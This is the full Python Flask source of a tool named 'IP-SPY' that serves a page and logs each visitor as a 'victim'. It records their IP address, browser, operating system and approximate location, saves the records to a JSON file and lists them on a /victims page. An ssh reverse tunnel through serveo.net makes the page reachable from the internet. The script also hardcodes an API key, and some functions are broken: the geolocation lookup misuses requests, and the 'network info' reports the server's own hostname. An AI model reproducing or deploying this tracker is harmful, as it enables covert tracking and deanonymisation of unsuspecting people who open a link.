from flask import Flask, request, render_template, redirect, url_for
import socket
import requests
import json
import subprocess
from colorama import Fore, Style, init
from datetime import datetime
import time

app = Flask(__name__)
victim_info = []
custom_ports = set()
init(autoreset=True)

def print_title():
    print(Fore.GREEN + "╔══════════════════════════════════════════╗")
    print(Fore.GREEN + "║ 🕵️‍♂️ IP-SPY 🕵️‍♂️ ║")
    print(Fore.GREEN + "╚══════════════════════════════════════════╝")

def print_contributors():
    print(Fore.CYAN + "Contributors: " + Fore.RESET + "AlexBebe, TnytCoder")

def print_loading():
    for _ in range(3):
        time.sleep(0.5)
        print(Fore.YELLOW + "Initializing IP-SPY tool..." + Style.RESET_ALL, end="\r")
    time.sleep(0.5)
    print(" " * 30, end="\r")

@app.route('/', methods=['GET'])
def home():
    ip = get_ip_address()
    real_ip = get_real_ip(ip)
    user_agent = request.headers.get('User-Agent')
    os = get_os(user_agent)
    location = get_location(real_ip)
    city = location.get('location', {}).get('capital', 'Unknown')
    country_name = location.get('country_name', 'Unknown')
    country_flag_emoji = location.get('location', {}).get('country_flag_emoji', 'Unknown')
    latitude = location.get('latitude')
    longitude = location.get('longitude')
    network_info = get_network_info()
    timestamp = get_current_timestamp()
    victim_data = {
        "IP Address": ip,
        "Real IP": real_ip,
        "Browser": user_agent,
        "Operating System": os,
        "City": city,
        "Country": country_name,  # Fixed variable name
        "Country Flag Emoji": country_flag_emoji,
        "Network Info": network_info,
        "Timestamp": timestamp
    }
    store_victim_info(victim_data)
    store_victim_info_in_json(victim_data)
    return render_template('index.html', victim_data=victim_data, map_url=get_map_url(latitude, longitude))

@app.route('/victims', methods=['GET'])
def display_victims():
    return render_template('victims.html', victim_info=victim_info)

def get_ip_address():
    try:
        ip = request.environ['HTTP_X_FORWARDED_FOR']
    except KeyError:
        ip = request.environ['REMOTE_ADDR']
    return ip

def get_real_ip(ip):
    if ip != "127.0.0.1":
        try:
            response = requests.get(f'https://ipapi.co/{ip}/json/')
            location = response.json()
            real_ip = location['ip']
        except requests.exceptions.RequestException:
            real_ip = 'Unknown'
    else:
        real_ip = 'Localhost'
    return real_ip

def get_os(user_agent):
    if "Windows" in user_agent:
        os = "Windows"
    elif "Mac" in user_agent:
        os = "Mac"
    elif "X11" in user_agent:
        os = "Unix"
    elif "Linux" in user_agent:
        os = "Linux"
    else:
        os = "Unknown"
    return os

def get_location(real_ip):
    try:
        url = requests.get(f'https://api.ipapi.com/{real_ip}?access_key=257f87ecd464099ce0faa6db1cde5516&format=1')
        response = requests.get(url)
        location = response.json()
    except requests.exceptions.RequestException:  # This line was missing
        location = {}
    return location

def get_map_url(latitude, longitude):
    if latitude and longitude:
        return f"https://maps.google.com/?q={latitude},{longitude}"
    return None

def get_network_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except socket.error:
        local_ip = 'Unknown'
    return {"Hostname": hostname, "Local IP": local_ip}

def get_current_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def store_victim_info(data):
    victim_info.append(data)
    print(Fore.CYAN + "🕵 Victim Information:")
    for key, value in data.items():
        print(f"{Fore.YELLOW}{key}:{Fore.RESET} {value}")
    print(Style.RESET_ALL)

def store_victim_info_in_json(data):
    with open('victim_info.json', 'a') as json_file:
        json.dump(data, json_file, indent=2)
        json_file.write("\n")

def run_server(subdomain, port):
    serveo_command = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
    subprocess.Popen(serveo_command, shell=True)
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    print_title()
    print_contributors()
    input(Fore.YELLOW + "Press Enter to start the IP-SPY tool..." + Style.RESET_ALL)
    print_loading()
    subdomain = input("Enter a subdomain for Serveo (e.g., yourname): ")
    custom_port = input("Enter a custom port for Flask (e.g., 8999): ")
    print(Fore.GREEN + "🚀 IP-SPY tool is now online...")
    print(Fore.YELLOW + f"To view previously gathered victim information, visit: http://localhost:{custom_port}/victims" + Style.RESET_ALL)
    run_server(subdomain, custom_port)